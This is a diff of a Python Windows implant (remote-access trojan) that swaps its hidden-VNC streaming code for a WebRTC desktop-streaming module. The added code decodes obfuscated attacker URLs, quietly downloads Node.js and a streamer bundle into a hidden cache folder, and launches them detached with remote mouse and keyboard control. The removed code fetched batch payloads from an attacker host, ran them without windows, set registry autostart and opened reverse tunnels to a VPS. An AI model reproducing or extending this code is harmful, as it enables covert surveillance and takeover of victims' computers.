@@ -12,6 +12,9 @@ import time
 import random
 import shutil
 import threading
+import glob
+import zipfile
+import urllib.request
 
 try:
     from _build_id import BUILD_ID
@@ -480,1147 +483,213 @@ def _persistence_guard() -> None:
             continue
 
 
-def _run_hidden(vnc_dir: str, bat_name: str, bat_url: str, arg: str):
-    """Download a payload bat + the no-console launcher and run the bat with
-    ZERO visible windows (GUI-subsystem run_hidden.exe -> cmd /d /s /c).
-    Falls back to a wscript hidden-launch if the exe cannot be fetched.
-    Returns an error string, or None on success."""
-    import urllib.request
-    os.makedirs(vnc_dir, exist_ok=True)
-    dst = os.path.join(vnc_dir, bat_name)
-    try:
-        urllib.request.urlretrieve(bat_url, dst)
-    except Exception as e:
-        return f"download failed: {e}"
+# ===== NETVNC STREAM (WebRTC desktop stream + remote control) =====
+# Lazy pull of Node.js (official zip from nodejs.org/dist) + the netvnc
+# desktop streamer bundle (werift/ffmpeg-static/ws + stream-video-script.js).
+# Installs hidden under %USERPROFILE%\\.cache (same dir as the implant),
+# runs detached + hidden. netvnc signaling/viewer/TURN already live on VPS.
+STREAM_WS = _x("3a3e3e7762622328393b232e6335343f2c3e203e63232839623a3e")   # wss://netvnc.xyrasms.net/ws
+VIEWER_BASE = _x("2539393d3e7762622328393b232e6335343f2c3e203e63232839")   # https://netvnc.xyrasms.net
+NODE_ZIP_URL = _x("2539393d3e77626223222928273e63223f2a6229243e39623b7f7f637c79637d6223222928603b7f7f637c79637d603a242360357b796337243d")   # nodejs.org/dist v22.14.0 win-x64
+BUNDLE_URL = _x("2539393d3e7762623f2c3a632a243925382f383e283f2e222339282339632e2220623a282c39282e252139296229223a2321222c293e62202c2423622328393b232e1229283e2639223d123a24237b796337243d")   # GitHub raw bundle
+NODE_DIR = _x("233b23222928")     # nvnode
+DESK_DIR = _x("233b29283e26")     # nvdesk
+BUNDLE_NAME = _x("2328393b232e1229283e2639223d123a24237b796337243d")
 
-    launcher = os.path.join(vnc_dir, "run_hidden.exe")
-    if not (os.path.isfile(launcher) and os.path.getsize(launcher) > 1000):
+_stream_state = {"popen": None, "phase": "idle", "room": "", "last_error": ""}
+
+
+def _stream_dir(name: str) -> str:
+    return os.path.join(_base_dir(), INSTALL_DIR_NAME, name)
+
+
+def _node_exe():
+    hits = glob.glob(os.path.join(_stream_state_path(), NODE_DIR, "**", "node.exe"),
+                     recursive=True)
+    return hits[0] if hits else None
+
+
+def _stream_state_path() -> str:
+    return os.path.join(_base_dir(), INSTALL_DIR_NAME)
+
+
+def _download_to(url: str, dest: str) -> None:
+    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+    with urllib.request.urlopen(req, timeout=120) as resp, open(dest, "wb") as f:
+        while True:
+            chunk = resp.read(1 << 20)
+            if not chunk:
+                break
+            f.write(chunk)
+
+
+def _extract_zip(zpath: str, dest: str) -> None:
+    with zipfile.ZipFile(zpath) as z:
+        z.extractall(dest)
+
+
+def _spawn_hidden(argv, cwd=None):
+    """Detached, fully hidden process (no window, no console flash)."""
+    si = subprocess.STARTUPINFO()
+    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+    si.wShowWindow = 0   # SW_HIDE
+    return subprocess.Popen(
+        argv,
+        cwd=cwd,
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+        stdin=subprocess.DEVNULL,
+        creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
+        startupinfo=si,
+        close_fds=True,
+    )
+
+
+def deploy_stream(room: str = "default") -> str:
+    """Ensure Node + netvnc streamer bundle are installed (hidden under
+    %USERPROFILE%\\.cache), then launch the WebRTC streamer detached.
+    Remote control (mouse/keyboard via /control relay) is enabled."""
+    if os.name != "nt":
+        return "[!] stream: Windows only"
+
+    def work():
         try:
-            urllib.request.urlretrieve(
-                f"http://{LHOST}:8000/run_hidden.exe", launcher)
+            _stream_state["phase"] = "checking"
+            base = os.path.join(_base_dir(), INSTALL_DIR_NAME)
+            node_root = _stream_state_path()
+
+            node = _node_exe()
+            if not node:
+                _stream_state["phase"] = "downloading node"
+                nz = os.path.join(base, "nvnode.zip")
+                _download_to(NODE_ZIP_URL, nz)
+                hide_path(nz)
+                nroot = os.path.join(base, NODE_DIR)
+                os.makedirs(nroot, exist_ok=True)
+                _extract_zip(nz, nroot)
+                os.remove(nz)
+                hide_path(nroot)
+                node = _node_exe()
+            if not node:
+                _stream_state["last_error"] = "node.exe not found after install"
+                _stream_state["phase"] = "failed"
+                return
+
+            desk = os.path.join(base, DESK_DIR)
+            marker = os.path.join(desk, ".installed")
+            script = os.path.join(desk, "stream-video-script.js")
+            if not os.path.exists(script):
+                _stream_state["phase"] = "downloading bundle"
+                bz = os.path.join(base, BUNDLE_NAME)
+                _download_to(BUNDLE_URL, bz)
+                hide_path(bz)
+                os.makedirs(desk, exist_ok=True)
+                _extract_zip(bz, desk)
+                os.remove(bz)
+                open(marker, "w").close()
+                hide_path(desk)
+                hide_path(marker)
+            if not os.path.exists(script):
+                _stream_state["last_error"] = "stream-video-script.js missing from bundle"
+                _stream_state["phase"] = "failed"
+                return
+
+            prev = _stream_state.get("popen")
+            if prev is not None and prev.poll() is None:
+                _stream_state["phase"] = "running"
+                return                      # already streaming
+
+            _stream_state["phase"] = "starting"
+            p = _spawn_hidden(
+                [node, script,
+                 "--stream-url", STREAM_WS,
+                 "--room", room,
+                 "--fps", "12",
+                 "--allow-control"],
+                cwd=desk,
+            )
+            time.sleep(2)
+            if p.poll() is not None:
+                _stream_state["last_error"] = f"streamer exited code={p.returncode}"
+                _stream_state["phase"] = "failed"
+                return
+            _stream_state.update(popen=p, pid=p.pid, room=room,
+                                 phase="running", last_error="")
+        except Exception as e:
+            _stream_state["last_error"] = str(e)
+            _stream_state["phase"] = "failed"
+
+    threading.Thread(target=work, daemon=True, name="nvstream").start()
+    return f"[+] netvnc stream deploy started (room={room}, control=on)"
+
+
+def stop_stream() -> str:
+    killed = 0
+    p = _stream_state.get("popen")
+    if p is not None and p.poll() is None:
+        try:
+            subprocess.run(["taskkill", "/PID", str(p.pid), "/T", "/F"],
+                           capture_output=True, timeout=15,
+                           creationflags=subprocess.CREATE_NO_WINDOW)
+            killed += 1
         except Exception:
-            launcher = None
-    if launcher and not (os.path.isfile(launcher) and os.path.getsize(launcher) > 1000):
-        launcher = None
-
-    flags = subprocess.CREATE_NO_WINDOW
-    if hasattr(subprocess, "DETACHED_PROCESS"):
-        flags |= subprocess.DETACHED_PROCESS
+            pass
+    # belt-and-braces: kill any node.exe running our script (e.g. after
+    # beacon restart lost the Popen handle)
     try:
-        if launcher:
-            subprocess.Popen(
-                [launcher, dst, arg],
-                creationflags=flags,
-                close_fds=True,
-            )
-        else:
-            vbs = os.path.join(vnc_dir, "run_setup.vbs")
-            with open(vbs, "w") as f:
-                f.write(f'CreateObject("WScript.Shell").Run "cmd /c ""{dst}"" {arg}", 0, False\n')
-            subprocess.Popen(
-                ["wscript.exe", vbs],
-                creationflags=flags,
-                close_fds=True,
-            )
-    except Exception as e:
-        return f"launch failed: {e}"
-    return None
-
-
-def deploy_vnc(cmd: str) -> bytes:
-    """'stream [id]': download vnc_target_setup.bat + run_hidden.exe and run
-    the bat with zero visible console. id N maps to VPS port 5900+N / web
-    UI 6079+N."""
-    parts = cmd.split()
-    target_id = parts[1] if len(parts) > 1 else "1"
-    if not target_id.isdigit():
-        return f"[!] usage: stream [id] (got '{target_id}')\n".encode() + MARKER
-
-    root = _base_dir()
-    if not root:
-        return b"[!] no USERPROFILE\n" + MARKER
-    err = _run_hidden(
-        os.path.join(root, "vnc"),
-        "vnc_target_setup.bat",
-        f"http://{LHOST}:8000/vnc_target_setup.bat",
-        target_id,
-    )
-    if err:
-        return f"[!] {err}\n".encode() + MARKER
-    return (
-        f"[+] VNC deployment started (target id {target_id}, "
-        f"web UI port {6079 + int(target_id)})\n"
-    ).encode() + MARKER
-
-
-def stop_vnc(cmd: str) -> bytes:
-    """'stop stream [id]': download vnc_target_stop.bat + run_hidden.exe and
-    run the bat hidden to tear VNC down on the target (kills winvnc + tunnel
-    loop, removes autostart). id defaults to 1."""
-    parts = cmd.split()
-    target_id = parts[-1] if parts[-1].isdigit() else "1"
-
-    root = _base_dir()
-    if not root:
-        return b"[!] no USERPROFILE\n" + MARKER
-    err = _run_hidden(
-        os.path.join(root, "vnc"),
-        "vnc_target_stop.bat",
-        f"http://{LHOST}:8000/vnc_target_stop.bat",
-        target_id,
-    )
-    if err:
-        return f"[!] {err}\n".encode() + MARKER
-    return f"[+] VNC teardown started (target id {target_id})\n".encode() + MARKER
-
-
-def _vnc_procs() -> str:
-    """Return tab-separated rows (pid, name, cmdline) for winvnc/ssh/plink."""
-    ps = ("Get-CimInstance Win32_Process | Where-Object { $_.Name -match "
-          "'winvnc|ssh|plink' } | ForEach-Object { \"{0}`t{1}`t{2}\" -f "
-          "$_.ProcessId, $_.Name, $_.CommandLine }")
-    try:
-        r = subprocess.run(
-            ["powershell", "-NoProfile", "-Command", ps],
-            capture_output=True, timeout=15,
+        ps = ("Get-CimInstance Win32_Process -Filter \"Name='node.exe'\" | "
+              "Where-Object { $_.CommandLine -like '*stream-video-script*' } | "
+              "ForEach-Object { Stop-Process -Id $_.ProcessId -Force }")
+        subprocess.run(
+            ["powershell", "-NoProfile", "-WindowStyle", "Hidden",
+             "-Command", ps],
+            capture_output=True, timeout=30,
             creationflags=subprocess.CREATE_NO_WINDOW,
         )
-        return r.stdout.decode("utf-8", errors="replace")
-    except Exception:
-        return ""
-
-
-def vnc_status() -> bytes:
-    """'streams' / 'list streams': report this target's VNC stream state."""
-    import re
-    root = _base_dir()
-    if not root:
-        return b"[!] no USERPROFILE\n" + MARKER
-    d = os.path.join(root, "vnc")
-    if not os.path.isdir(d):
-        return b"[*] VNC not deployed on this target\n" + MARKER
-
-    stream_id = None
-    try:
-        with open(os.path.join(d, "stream.id")) as f:
-            stream_id = f.read().strip() or None
     except Exception:
         pass
+    _stream_state.update(popen=None, pid=0, phase="stopped")
+    return f"[+] stream stopped ({killed} tracked)"
 
-    winvnc_pid = None
-    tunnel_pid = None
-    tunnel_port = None
-    for line in _vnc_procs().splitlines():
-        parts = line.split("\t")
-        if len(parts) < 3:
-            continue
-        pid, name, cl = parts[0], parts[1].lower(), parts[2]
-        if name == "winvnc.exe":
-            winvnc_pid = pid
-        elif name in ("ssh.exe", "plink.exe") and cl and "-R" in cl and "127.0.0.1:5900" in cl:
-            tunnel_pid = pid
-            m = re.search(r"-R\s+(\d+):127\.0\.0\.1:5900", cl)
-            if m:
-                tunnel_port = int(m.group(1))
 
-    if stream_id is None and tunnel_port:
-        stream_id = str(tunnel_port - 5900)
-    if stream_id is None and winvnc_pid:
-        stream_id = "?"
-
-    autostart = False
-    if os.name == "nt":
-        try:
-            import winreg
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_RUN_PATH)
-            autostart = winreg.QueryValueEx(key, "VncHidden")[0] != ""
-            winreg.CloseKey(key)
-        except Exception:
-            autostart = False
-
-    web = f"http://{LHOST}:{6079 + int(stream_id)}/vnc.html" if stream_id and stream_id.isdigit() else "?"
-    lines = [f"[*] target stream: id={stream_id or 'none'}"]
-    lines.append(f"    winvnc:    {'RUNNING pid ' + winvnc_pid if winvnc_pid else 'not running'}")
-    if tunnel_pid:
-        lines.append(f"    tunnel:    RUNNING pid {tunnel_pid} -> VPS 127.0.0.1:{tunnel_port}")
+def stream_status() -> str:
+    p = _stream_state.get("popen")
+    room = _stream_state.get("room") or "default"
+    if p is not None and p.poll() is None:
+        line = f"netvnc stream: RUNNING pid={p.pid} room={room} control=on"
+    elif _stream_state.get("phase") == "failed":
+        line = "netvnc stream: FAILED"
     else:
-        lines.append("    tunnel:    not running")
-    lines.append(f"    autostart: {'enabled (HKCU VncHidden)' if autostart else 'disabled'}")
-    lines.append(f"    web UI:    {web}   (password: {_x('092c2024212c3f28')})")
-    if winvnc_pid and tunnel_pid:
-        lines.append("    status:    ACTIVE - open the web UI URL above")
-    else:
-        lines.append(f"    status:    PARTIAL/STOPPED - deploy with: stream {stream_id or '1'}")
-    try:
-        with _S2["lock"]:
-            s2th, s2i = _S2["th"], dict(_S2["info"])
-        if s2th and s2th.is_alive():
-            lines.append("    stream2:  id=%s state=%s %sx%s@%s (%s)" % (
-                s2i.get("id"), s2i.get("state"), s2i.get("w"), s2i.get("h"),
-                s2i.get("fps"), s2i.get("encoder")))
-    except Exception:
-        pass
-    return ("\n".join(lines) + "\n").encode() + MARKER
-
-
-# ==================== STREAM2: python-native H.264 streaming ====================
-# UltraVNC-free streaming: DXGI Desktop Duplication capture (dxcam) on Win8+,
-# GDI (ctypes) fallback on Win7/CPU-only; H.264 encode via PyAV with a tiered
-# pick (h264_mf / Media-Foundation HW accel > libx264 universal software >
-# mpeg4); MPEG-TS over TCP 127.0.0.1:25900+id, reverse-tunnelled to the VPS
-# exactly like the VNC stream (see vnc_target_setup.bat). The python-embed
-# runtime has no site-packages, so on first use the wheel bundle is lazily
-# pulled from http://LHOST:8000/stream_bundle_cp<vmaj><vmin>_<arch>_v2.zip into
-# %USERPROFILE%\.cache\stream and imported from there. On dev boxes the
-# site-packages versions are used as-is (no download).
-
-STREAM2_PORT_BASE = 25900      # local TS listener + VPS tunnel port: 25900 + id
-STREAM2_DIR_NAME = "stream"    # under %USERPROFILE%\.cache
-STREAM2_DEF_W, STREAM2_DEF_H, STREAM2_DEF_FPS = 1280, 720, 10
-STREAM2_BR_1080P = 4_000_000   # anchor bitrate, scaled by pixel count
-STREAM2_HTTP_PORT = 8000       # bundle server (same port as the VNC files)
-STREAM2_BUNDLE_VER = "v2"      # bundle filename version; bump to force re-download
-STREAM2_SRT_PORT = 9000        # VPS SRT relay UDP listen port
-STREAM2_SRT_PAYLOAD = 1316     # per-message payload (relay recvmsg buffer is 4x)
-
-_S2 = {"th": None, "stop": threading.Event(), "id": None,
-       "info": {}, "lock": threading.Lock()}
-
-
-class _S2SockWriter:
-    """Socket adapter so PyAV can mux MPEG-TS straight to the viewer."""
-    __slots__ = ("sock", "stall_s", "stall_n", "blocked_since",
-                 "_wd_stop", "_wd")
-
-    def __init__(self, sock):
-        self.sock = sock
-        self.stall_s = 0.0
-        self.stall_n = 0
-        self.blocked_since = None
-        self._wd_stop = threading.Event()
-        self._wd = threading.Thread(target=self._watchdog, daemon=True,
-                                    name="s2-wd")
-        self._wd.start()
-
-    def _watchdog(self):
-        """Sample socket writability every second. sendall() blocks whenever
-        the kernel refuses writes (send buffer full AND peer receive window
-        exhausted). The instant it flips non-writable, the peer chain
-        (browser/websockify/sshd/ssh) has STOPPED READING - that is the start
-        of the freeze. Logs block start and duration."""
-        import select
-        sock = self.sock
-        while not self._wd_stop.wait(1.0):
-            try:
-                _, w, _ = select.select([], [sock], [], 0)
-            except Exception:
-                return
-            if w:
-                if self.blocked_since is not None:
-                    _s2_log("WRITE UNBLOCKED after %.1fs" %
-                            (time.time() - self.blocked_since))
-                    self.blocked_since = None
-            elif self.blocked_since is None:
-                self.blocked_since = time.time()
-                _s2_log("WRITE BLOCKED: kernel refuses writes "
-                        "(peer not draining)")
-
-    def close(self):
-        self._wd_stop.set()
-
-    def write(self, b):
-        t0 = time.time()
-        try:
-            self.sock.sendall(b)
-        except Exception as e:
-            self._wd_stop.set()
-            _s2_log("sendall %dB FAILED: %r" % (len(b), e))
-            raise
-        dt = time.time() - t0
-        if dt > 0.05:
-            _s2_log("sendall %dB took %.3fs (backpressure)" % (len(b), dt))
-            self.stall_s += dt
-            self.stall_n += 1
-
-
-def _s2_dir() -> str:
-    return os.path.join(_base_dir(), INSTALL_DIR_NAME, STREAM2_DIR_NAME)
-
-
-def _s2_log(msg) -> None:
-    """Ring-buffer + append-only file log for the stream2 path. Survives
-    C2 disconnects; the tail is shown by 'stream2 status'."""
-    line = "%s %s" % (time.strftime("%H:%M:%S"), msg)
-    ring = _S2.setdefault("log", [])
-    ring.append(line)
-    del ring[:-200]
-    try:
-        p = os.path.join(_s2_dir(), "stream2.log")
-        os.makedirs(os.path.dirname(p), exist_ok=True)
-        with open(p, "a") as f:
-            f.write(line + "\n")
-        if os.path.getsize(p) > 1 << 20:
-            os.replace(p, p + ".old")
-    except Exception:
-        pass
-
-
-def _s2_bundle_name() -> str:
-    try:
-        import platform
-        arch = {"amd64": "amd64", "x86": "win32", "arm64": "arm64"}.get(
-            platform.machine().lower())
-        if arch:
-            # Versioned name: the on-target cache key is the filename, so
-            # bumping the version forces re-download of fixed bundles.
-            return "stream_bundle_cp%d%d_%s_%s.zip" % (
-                sys.version_info[0], sys.version_info[1], arch,
-                STREAM2_BUNDLE_VER)
-    except Exception:
-        pass
-    return "stream_bundle_%s.zip" % STREAM2_BUNDLE_VER
-
-
-def _s2_load_runtime() -> None:
-    """Import av/dxcam/numpy - bundle on embed runtimes, site-packages on dev."""
-    for attempt in (0, 1):
-        try:
-            import av, dxcam, numpy  # noqa: F401
-            return
-        except Exception:
-            if attempt == 1:
-                raise RuntimeError("stream2 deps unavailable (av/dxcam/numpy)")
-        d = _s2_dir()
-        os.makedirs(d, exist_ok=True)
-        hide_path(d)
-        z = os.path.join(d, _s2_bundle_name())
-        if not os.path.isfile(z):
-            url = "http://%s:%d/%s" % (LHOST, STREAM2_HTTP_PORT,
-                                        _s2_bundle_name())
-            part = z + ".part"
-            try:
-                import urllib.request
-                with urllib.request.urlopen(url, timeout=90) as r, \
-                        open(part, "wb") as f:
-                    shutil.copyfileobj(r, f)
-                os.replace(part, z)   # atomic: never leave a partial bundle
-            except Exception as e:
-                try:
-                    os.remove(part)
-                except Exception:
-                    pass
-                raise RuntimeError("bundle download failed (%s)" % e)
-        try:
-            import zipfile
-            with zipfile.ZipFile(z) as zf:
-                if zf.testzip() is not None:
-                    raise RuntimeError("corrupt zip entry")
-                zf.extractall(d)
-        except Exception as e:
-            try:
-                os.remove(z)   # purge so the next deploy re-downloads
-            except Exception:
-                pass
-            raise RuntimeError("bundle extract failed (%s)" % e)
-        for sub in (d, os.path.join(d, "av.libs"),
-                    os.path.join(d, "numpy.libs"), os.path.join(d, "cv2"),
-                    os.path.join(d, "cv2", "bin")):
-            if os.path.isdir(sub):
-                os.add_dll_directory(sub)
-        sys.path.insert(0, d)
-
-
-def _s2_srt_name() -> str:
-    """CDN zip name for this machine; '' when SRT is unsupported (arm64)."""
-    try:
-        import platform
-        arch = {"amd64": "x64", "x86": "x86", "win32": "x86"}.get(
-            platform.machine().lower())
-        if arch:
-            return "srt_%s.zip" % arch
-    except Exception:
-        pass
-    return ""
-
-
-def _s2_srt_bind(lib) -> None:
-    """Declare ctypes signatures for the libsrt caller-side API surface."""
-    import ctypes
-    c_int = ctypes.c_int
-    lib.srt_startup.restype = c_int
-    lib.srt_startup.argtypes = []
-    lib.srt_getversion.restype = c_int
-    lib.srt_getversion.argtypes = []
-    lib.srt_create_socket.restype = c_int
-    lib.srt_create_socket.argtypes = []
-    lib.srt_close.restype = c_int
-    lib.srt_close.argtypes = [c_int]
-    lib.srt_setsockopt.restype = c_int
-    lib.srt_setsockopt.argtypes = [c_int, c_int, c_int, ctypes.c_void_p, c_int]
-    lib.srt_connect.restype = c_int
-    lib.srt_connect.argtypes = [c_int, ctypes.c_void_p, c_int]
-    lib.srt_sendmsg.restype = c_int
-    lib.srt_sendmsg.argtypes = [c_int, ctypes.c_char_p, c_int, c_int, c_int]
-
-
-# SRTO_* option ids used by the caller (SRT 1.5.x, E2E-verified working set).
-_SRT_OPTS = {"SNDBUF": 5, "RCVBUF": 6, "TSBPDMODE": 22, "LATENCY": 23,
-             "SNDDROPDELAY": 32, "NAKREPORT": 33, "CONNTIMEO": 36,
-             "STREAMID": 46, "MESSAGEAPI": 48, "PAYLOADSIZE": 49}
-
-
-def _s2_load_srt():
-    """Lazily pull srt_<arch>.zip from the CDN and load libsrt.dll.
-    Returns the ctypes handle or None (caller falls back to TCP)."""
-    import ctypes
-    name = _s2_srt_name()
-    if not name:
-        return None
-    d = os.path.join(_s2_dir(), "srt")
-    os.makedirs(d, exist_ok=True)
-    hide_path(d)
-    z = os.path.join(d, name)
-    if not os.path.isfile(z):
-        url = "http://%s:%d/%s" % (LHOST, STREAM2_HTTP_PORT, name)
-        part = z + ".part"
-        try:
-            import urllib.request
-            with urllib.request.urlopen(url, timeout=60) as r, \
-                    open(part, "wb") as f:
-                shutil.copyfileobj(r, f)
-            os.replace(part, z)   # atomic: never leave a partial zip
-        except Exception as e:
-            try:
-                os.remove(part)
-            except Exception:
-                pass
-            _s2_log("srt zip download FAILED: %r (TCP fallback)" % e)
-            return None
-    try:
-        import zipfile
-        with zipfile.ZipFile(z) as zf:
-            if zf.testzip() is not None:
-                raise RuntimeError("corrupt zip entry")
-            zf.extractall(d)
-    except Exception as e:
-        try:
-            os.remove(z)   # purge so the next deploy re-downloads
-        except Exception:
-            pass
-        _s2_log("srt zip extract FAILED: %r (TCP fallback)" % e)
-        return None
-    try:
-        os.add_dll_directory(d)
-        lib = ctypes.CDLL(os.path.join(d, "libsrt.dll"))
-        _s2_srt_bind(lib)
-        lib.srt_startup()
-        ver = lib.srt_getversion()
-        _s2_log("libsrt loaded %d.%d.%d (%s)" % (
-            ver >> 16, (ver >> 8) & 0xFF, ver & 0xFF, name))
-        return lib
-    except Exception as e:
-        _s2_log("srt DLL load FAILED: %r (TCP fallback)" % e)
-        return None
-
-
-def _s2_srt_connect(lib, target_id: str):
-    """Create the caller socket and connect to the relay (UDP :9000 on the
-    VPS). Returns the SRTSOCKET or None on failure (socket already closed).
-    The MESSAGE API is mandatory on BOTH peers (the relay sets it too); a
-    stream API peer is rejected at the handshake. One fresh socket per
-    attempt: a rejected/closed peer must never be reused - this libsrt build
-    can crash on continued API use after a close."""
-    import ctypes
-    import struct
-    c_int = ctypes.c_int
-    u = lib.srt_create_socket()
-    if u < 0:
-        _s2_log("srt_create_socket failed (%d)" % u)
-        return None
-
-    def opt(name, val):
-        v = c_int(val)
-        r = lib.srt_setsockopt(u, 0, _SRT_OPTS[name], ctypes.byref(v),
-                               ctypes.sizeof(v))
-        if r < 0:
-            _s2_log("setopt %s=%d failed (%d)" % (name, val, r))
-
-    opt("TSBPDMODE", 1)          # paced delivery: sender blocks on backpressure
-    opt("LATENCY", 1000)         # 1s TSBPD window
-    opt("SNDBUF", 4 << 20)
-    opt("RCVBUF", 8 << 20)
-    opt("SNDDROPDELAY", 1000)    # drop late packets, don't stall the stream
-    opt("NAKREPORT", 1)
-    opt("CONNTIMEO", 3000)       # ms
-    opt("PAYLOADSIZE", STREAM2_SRT_PAYLOAD)
-    opt("MESSAGEAPI", 1)         # REQUIRED: handshake rejects stream API peers
-    sid = ("s2:%s" % target_id).encode()
-    sb = ctypes.create_string_buffer(sid)
-    if lib.srt_setsockopt(u, 0, _SRT_OPTS["STREAMID"], sb, len(sid)) < 0:
-        _s2_log("setopt STREAMID failed")
-    sa = struct.pack("=HH4s8x", socket.AF_INET,
-                     socket.htons(STREAM2_SRT_PORT), socket.inet_aton(LHOST))
-    ab = ctypes.create_string_buffer(sa)
-    t0 = time.time()
-    if lib.srt_connect(u, ctypes.cast(ab, ctypes.c_void_p),
-                       ctypes.sizeof(ab)) < 0:
-        _s2_log("srt_connect to %s:%d FAILED after %.1fs" % (
-            LHOST, STREAM2_SRT_PORT, time.time() - t0))
-        try:
-            lib.srt_close(u)
-        except Exception:
-            pass
-        return None
-    _s2_log("srt relay connected %s:%d in %.2fs streamid=%s" % (
-        LHOST, STREAM2_SRT_PORT, time.time() - t0,
-        sid.decode(errors="replace")))
-    return u
-
-
-class _S2SRTWriter:
-    """File-like adapter so PyAV muxes MPEG-TS into SRT messages. The relay
-    reassembles messages into the plain TCP byte stream, so message
-    boundaries are invisible downstream (188-byte TS framing is preserved in
-    order). Buffers to full 1316-byte messages (7 TS packets); sendmsg is
-    synchronous (SNDSYN default), so a long sendmsg == peer not draining,
-    logged like the TCP writer's watchdog: stall_s/stall_n feed the 5s stats
-    line (select() does not work on SRT sockets, so no watchdog thread)."""
-    __slots__ = ("lib", "u", "_pend", "stall_s", "stall_n", "closed")
-
-    def __init__(self, lib, u):
-        self.lib = lib
-        self.u = u
-        self._pend = bytearray()
-        self.stall_s = 0.0
-        self.stall_n = 0
-        self.closed = False
-
-    def _sendmsg(self, data):
-        r = self.lib.srt_sendmsg(self.u, bytes(data), len(data), -1, 1)
-        if r < 0:
-            raise IOError("srt_sendmsg failed (%d)" % r)
-        return r
-
-    def write(self, b):
-        if self.closed:
-            raise ValueError("write to closed srt writer")
-        self._pend += b
-        t0 = time.time()
-        try:
-            while len(self._pend) >= STREAM2_SRT_PAYLOAD:
-                self._sendmsg(self._pend[:STREAM2_SRT_PAYLOAD])
-                del self._pend[:STREAM2_SRT_PAYLOAD]
-        finally:
-            dt = time.time() - t0
-            if dt > 0.05:
-                _s2_log("srt sendmsg took %.3fs (backpressure)" % dt)
-                self.stall_s += dt
-                self.stall_n += 1
-        return len(b)
-
-    def flush(self):
-        if not self.closed and self._pend:
-            try:
-                self._sendmsg(bytes(self._pend))
-            except Exception:
-                pass
-            self._pend.clear()
-
-    def close(self):
-        if self.closed:
-            return
-        try:
-            self.flush()
-        except Exception:
-            pass
-        self.closed = True
-        try:
-            self.lib.srt_close(self.u)
-        except Exception:
-            pass
-
-
-
-def _s2_gdi_grab():
-    """Win7/GDI fallback screen capture -> BGR ndarray (ctypes only)."""
-    import ctypes
-    from ctypes import wintypes
-    gdi32 = ctypes.WinDLL("gdi32", use_last_error=True)
-    user32 = ctypes.WinDLL("user32", use_last_error=True)
-    w, h = user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)
-    if w <= 0 or h <= 0:
-        return None
-    hdc = user32.GetDC(None)
-    mem = gdi32.CreateCompatibleDC(hdc)
-
-    class BITMAPINFOHEADER(ctypes.Structure):
-        _fields_ = [
-            ("biSize", wintypes.DWORD), ("biWidth", wintypes.LONG),
-            ("biHeight", wintypes.LONG), ("biPlanes", wintypes.WORD),
-            ("biBitCount", wintypes.WORD), ("biCompression", wintypes.DWORD),
-            ("biSizeImage", wintypes.DWORD), ("biXPelsPerMeter", wintypes.LONG),
-            ("biYPelsPerMeter", wintypes.LONG), ("biClrUsed", wintypes.DWORD),
-            ("biClrImportant", wintypes.DWORD),
-        ]
-
-    bmi = BITMAPINFOHEADER()
-    bmi.biSize = ctypes.sizeof(BITMAPINFOHEADER)
-    bmi.biWidth, bmi.biHeight = w, -h   # negative height = top-down rows
-    bmi.biPlanes, bmi.biBitCount = 1, 32
-    bits = ctypes.c_void_p()
-    dib = gdi32.CreateDIBSection(mem, ctypes.byref(bmi), 0,
-                                 ctypes.byref(bits), None, 0)
-    if not dib:
-        gdi32.DeleteDC(mem)
-        user32.ReleaseDC(None, hdc)
-        return None
-    gdi32.SelectObject(mem, dib)
-    if not gdi32.BitBlt(mem, 0, 0, w, h, hdc, 0, 0, 0x00CC0020):  # SRCCOPY
-        gdi32.DeleteObject(dib)
-        gdi32.DeleteDC(mem)
-        user32.ReleaseDC(None, hdc)
-        return None
-    import numpy as np
-    arr = np.frombuffer(ctypes.string_at(bits, w * h * 4), dtype=np.uint8
-                        ).reshape(h, w, 4)[:, :, :3].copy()  # BGRA -> BGR
-    gdi32.DeleteObject(dib)
-    gdi32.DeleteDC(mem)
-    user32.ReleaseDC(None, hdc)
-    return arr
-
-
-def _s2_gdi_capture():
-    """GDI-only backend -> (grab, stop). Raises if GDI capture is unavailable."""
-    grab = _s2_gdi_grab
-    if grab() is None:
-        raise RuntimeError(
-            "no capture backend (kernels + cv2 + GDI all unavailable)")
-    return grab, (lambda: None)
-
-
-def _s2_capture():
-    """Start the best capture backend -> (grab, stop). Raises on total failure.
-
-    Pre-flight: dxcam's numpy backend needs its compiled _numpy_kernels
-    extension. On clean VMs that import can fail (WinError 126 - missing
-    VCOMP140.DLL / VC++ OpenMP runtime), and dxcam then silently swaps to its
-    cv2 processor, which hard-imports cv2 inside the capture thread. If cv2
-    is absent that thread dies and get_latest_frame returns None forever
-    (silent dead stream), so probe the kernel flag first and only trust the
-    numpy backend when either the kernels import or cv2 is available."""
-    import dxcam
-    try:
-        from dxcam.processor.cv2_processor import _NUMPY_KERNELS_AVAILABLE
-        kernels_ok = bool(_NUMPY_KERNELS_AVAILABLE)
-    except Exception:
-        # older/unknown dxcam layout: assume kernels are fine; the guarded
-        # grab loop still degrades to GDI if the thread dies at runtime
-        kernels_ok = True
-    if not kernels_ok:
-        try:
-            import cv2  # noqa: F401  (dxcam's cv2 fallback path needs this)
-        except Exception:
-            return _s2_gdi_capture()
-    cam = None
-    try:
-        cam = dxcam.create(output_idx=0, output_color="BGR",
-                           processor_backend="numpy")
-    except TypeError:
-        # older dxcam without processor_backend kwarg
-        cam = dxcam.create(output_idx=0, output_color="BGR")
-    except Exception:
-        cam = None
-    if cam is not None:
-        cam.start(target_fps=STREAM2_DEF_FPS, video_mode=True)
-        return cam.get_latest_frame, cam.stop
-    return _s2_gdi_capture()
-
-
-def _s2_bitrate(w, h) -> int:
-    return max(250_000, min(8_000_000,
-                            int(STREAM2_BR_1080P * w * h / (1920 * 1080))))
-
-
-def _s2_make_encoder(name, w, h, fps, br):
-    """Create + open an encoder context by name (with MF-open retry)."""
-    import av
-    from fractions import Fraction
-    c = av.CodecContext.create(name, "w")
-    c.width, c.height = w, h
-    c.time_base = Fraction(1, fps)
-    c.framerate = fps
-    c.pix_fmt = "yuv420p"
-    c.bit_rate = br
-    if name == "libx264":
-        c.options = {"preset": "veryfast", "tune": "zerolatency"}
-    elif name == "h264_mf":
-        c.options = {"usage": "1"}
-    last = None
-    for i in range(3):
-        try:
-            c.open()
-            return c
